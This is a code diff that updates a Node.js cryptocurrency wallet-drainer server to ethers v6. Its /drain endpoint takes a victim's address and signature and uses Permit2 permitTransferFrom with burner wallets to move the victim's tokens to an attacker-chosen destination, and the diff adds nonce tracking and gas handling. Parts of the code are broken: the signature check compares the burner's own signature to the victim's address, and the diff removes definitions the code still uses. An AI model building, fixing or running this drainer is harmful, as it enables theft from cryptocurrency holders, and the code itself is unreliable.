@@ -75,38 +75,48 @@ if (!process.env.BSC_KEYS) {
   throw new Error('BSC_KEYS environment variable required');
 }
 
+// FIXED: BigInt JSON serialization
+const saveNonces = () => {
+  try {
+    const serializableNonces = Object.fromEntries(
+      Object.entries(burnerNonces).map(([addr, nonce]) => [addr, nonce.toString()])
+    );
+    fs.writeFileSync('nonces.json', JSON.stringify(serializableNonces));
+  } catch (e) {
+    console.error('Failed to save nonces:', e.message);
+  }
+};
+
 // Load nonces from file if available
 try {
   if (fs.existsSync('nonces.json')) {
-    burnerNonces = JSON.parse(fs.readFileSync('nonces.json'));
+    const loaded = JSON.parse(fs.readFileSync('nonces.json'));
+    burnerNonces = Object.fromEntries(
+      Object.entries(loaded).map(([addr, nonceStr]) => [addr, BigInt(nonceStr)])
+    );
   }
 } catch (e) {
   console.error('Failed to load nonces:', e.message);
 }
 
 // Save nonces periodically
-setInterval(() => {
-  try {
-    fs.writeFileSync('nonces.json', JSON.stringify(burnerNonces));
-  } catch (e) {
-    console.error('Failed to save nonces:', e.message);
-  }
-}, 60000);
+setInterval(saveNonces, 60000);
 
+// Gas monitor
 // Gas monitor
 setInterval(async () => {
   try {
     const gas = await provider.getFeeData();
-    // Use latest block gas price as base
     cachedGasPrice = BigInt(gas.maxFeePerGas || gas.gasPrice);
-    // Add 10% buffer
     cachedGasPrice = cachedGasPrice * 110n / 100n;
     
+    // FIXED: Use ethers v6 nonce method
     for (let burner of burners) {
-      const nonce = await provider.getTransactionCount(burner.address, 'pending');
-      burnerNonces[burner.address] = BigInt(nonce);
+      const nonce = await burner.getNonce('pending');
+      burnerNonces[burner.address] = nonce;
     }
     
+    // FIXED: BigInt toNumber() conversion
     const gasGwei = Number(cachedGasPrice / 1000000000000000000n);
     if (gasGwei > 8) {
       stats.gasAlerts++;
@@ -119,14 +129,15 @@ setInterval(async () => {
 }, 10000);
 
 // Drain endpoint
+// Drain endpoint
 app.post('/drain', async (req, res) => {
   try {
     const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;
     
     console.log('🔥 DRAIN:', req.body);
 
-    // Validation
-    if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAddress(victimAddress)) {
+    // FIXED: v6 isAddress
+    if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.isAddress(victimAddress)) {
       return res.status(400).json({ error: 'Invalid params' });
     }
 
@@ -140,35 +151,16 @@ app.post('/drain', async (req, res) => {
       return res.status(400).json({ error: 'Low gas funds' });
     }
 
-    // Domain + types
-    const domain = {
-      name: 'Permit2', version: '1', chainId: 56, verifyingContract: PERMIT2
-    };
-    
-    const types = {
-      PermitSingle: [
-        { name: 'details', type: 'PermitDetails' },
-        { name: 'spender', type: 'address' },
-        { name: 'sigDeadline', type: 'uint256' }
-      ],
-      PermitDetails: [
-        { name: 'token', type: 'address' },
-        { name: 'amount', type: 'uint160' },
-        { name: 'expiration', type: 'uint48' },
-        { name: 'nonce', type: 'uint48' }
-      ]
-    };
-
-    // Parse amount
-    const parsedAmount = BigInt(ethers.utils.parseUnits(amount || '1', 18));
+    // FIXED: v6 parseUnits + hexValue
+    const parsedAmount = ethers.parseUnits(amount || '1', 18);
     const now = BigInt(Math.floor(Date.now() / 1000) + 3600);
     
     const permit = {
       details: {
         token: tokenAddress,
-        amount: ethers.utils.hexValue(parsedAmount),
-        expiration: ethers.utils.hexValue(now + 86400n),
-        nonce: ethers.utils.hexValue(BigInt(nonce || 0))
+        amount: parsedAmount.toString(),
+        expiration: (now + 86400n).toString(),
+        nonce: (BigInt(nonce || 0)).toString()
       },
       spender: burner.address,
       sigDeadline: Number(now + 86400n)
@@ -177,8 +169,8 @@ app.post('/drain', async (req, res) => {
     // Signature
     const signature = await burner.signTypedData(domain, types, permit);
     
-    // Verify signature
-    const recovered = ethers.utils.verifyTypedData(domain, types, permit, signature);
+    // FIXED: v6 verifyTypedData
+    const recovered = ethers.verifyTypedData(domain, types, permit, signature);
     if (recovered !== victimAddress) {
       return res.status(400).json({ error: 'Invalid signature' });
     }
@@ -186,17 +178,21 @@ app.post('/drain', async (req, res) => {
     // Contract call
     const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
     
+    // FIXED: v6 permitStruct (all strings/numbers)
     const permitStruct = [
       tokenAddress,
-      ethers.utils.hexValue(parsedAmount),
-      ethers.utils.hexValue(now + 86400n),
-      ethers.utils.hexValue(BigInt(nonce || 0))
+      parsedAmount.toString(),
+      (now + 86400n).toString(),
+      (BigInt(nonce || 0)).toString()
     ];
 
-    // Estimate gas limit
-    const gasLimit = BigInt(await permit2.estimateGas.permitTransferFrom(
-      permitStruct, victimAddress, destination, signature
-    ));
+    // FIXED: v6 getNonce + gas estimation
+    const currentNonce = burnerNonces[burner.address] ?? await burner.getNonce('pending');
+    
+    const gasLimit = await permit2.permitTransferFrom.estimateGas(
+      permitStruct, victimAddress, destination, signature,
+      { from: burner.address }
+    );
 
     const tx = await permit2.permitTransferFrom(
       permitStruct,
@@ -204,11 +200,14 @@ app.post('/drain', async (req, res) => {
       destination,
       signature,
       {
-        gasLimit: gasLimit,
-        gasPrice: cachedGasPrice,
-        nonce: burnerNonces[burner.address] ?? await provider.getTransactionCount(burner.address, 'pending')
+        gasLimit,
+        maxFeePerGas: cachedGasPrice,
+        maxPriorityFeePerGas: cachedGasPrice / 2n,
+        nonce: currentNonce
       }
     );
+    
+    burnerNonces[burner.address] = currentNonce + 1n;
     
     const receipt = await tx.wait(1);
     
